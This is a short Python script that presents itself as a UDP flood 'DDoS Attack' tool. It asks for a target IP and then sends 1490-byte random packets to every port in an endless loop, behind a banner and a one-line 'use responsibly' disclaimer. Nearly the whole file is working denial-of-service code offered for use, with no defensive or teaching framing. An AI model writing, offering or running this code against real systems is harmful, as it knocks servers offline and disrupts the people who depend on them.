import socket,random,os,time,sys

os.system("cls" if os.name == "nt" else "clear")

print("""\033[91m███╗   ██╗██╗  ██╗      ██████╗  ██████╗ ███████╗
\033[93m████╗  ██║██║  ██║      ██╔══██╗██╔═══██╗██╔════╝
\033[92m██╔██╗ ██║███████║█████╗██║  ██║██║   ██║███████╗
\033[96m██║╚██╗██║██╔══██║╚════╝██║  ██║██║   ██║╚════██║
\033[95m██║ ╚████║██║  ██║      ██████╔╝╚██████╔╝███████║
\033[94m╚═╝  ╚═══╝╚═╝  ╚═╝      ╚═════╝  ╚═════╝ ╚══════╝\033[0m
\033[92m          ⚡ UDP FLOOD ATTACK TOOL ⚡\033[0m
\033[1;31m══════════════════════════════════════════════════
\033[1;33m[★] Tool Name    : DDoS Attack 
[★] Developed By : Dark-NH
[★] GitHub       : github.com/DarkNH-cyber
[★] Version      : 1.3.7
[★] Status       : ONLINE
\033[1;31m══════════════════════════════════════════════════
\033[1;36m[!] Ultra-fast UDP Flood tool designed for network stress.
[!] Use responsibly. Generates massive traffic to overwhelm target servers.
[i] Press Ctrl+C anytime to stop the attack safely.
\033[1;36m══════════════════════════════════════════════════""")

ip = input("\033[1;32mEnter Terget IP: \033[0m")
sent = 0
port = 0
sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
byte_data = random._urandom(1490)

#Loading Massage
spinner = ['|', '/', '-', '\\']  # Rotating spinner symbols
print("\033[1;31m[•] Start Attack......\033[0m", end="")

for _ in range(20):  # Total number of rotations
    for frame in spinner:
        sys.stdout.write(f"\r\033[1;31m[•] Start Attack......{frame}\033[0m")
        sys.stdout.flush()
        time.sleep(0.2)

try:
    while True:
        port += 1
        sock.sendto(byte_data,(ip,port))
        sent += 1
        print(f"\033[92mSent \033[93m{sent} \033[92mpacket in \033[96m{ip} \033[92mthrough port \033[91m{port}\033[0m")
        if port == 65535:
            port = 0
except KeyboardInterrupt:
    print("\nStopping Attack...\n")
    print("\033[91m[!] Attack Stopped by User (Ctrl+C)\033[0m")